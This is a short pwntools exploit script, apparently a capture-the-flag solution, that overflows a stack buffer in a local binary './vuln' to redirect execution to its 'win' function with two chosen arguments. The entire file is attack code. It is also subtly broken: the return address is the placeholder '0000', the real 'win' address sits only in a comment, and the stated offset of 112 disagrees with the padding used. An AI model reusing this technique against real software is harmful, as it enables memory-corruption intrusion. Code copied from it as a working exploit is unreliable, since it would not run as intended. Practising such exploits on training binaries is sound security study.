#!/usr/bin/env python3

import argparse
import pwn

# Load the ELF
elf = pwn.ELF('./vuln')
p = elf.process()
print(elf)

# Receive and print the initial output from the process
print(p.recv().decode('utf-8'))

offset = 112

# Get the address of the 'win' function
new_eip = pwn.p32(elf.symbols['win'])

arg1 = pwn.p32(0xCAFEF00D)
arg2 = pwn.p32(0xF00DF00D)

# Create the payload
# payload = b'A' * offset + new_eip

payload = b''.join(
  [
    b'A' * 100,
    b'B' * 8,  # Padding
    b'0000',  # EIP
    arg1,
    arg2,
  ]
)

# May cause the script to stall
# print(p.recv().decode('utf-8'))  # Optional message after sending

# Send the payload
p.sendline(payload)

# Pass to interactive mode
# p.interactive()

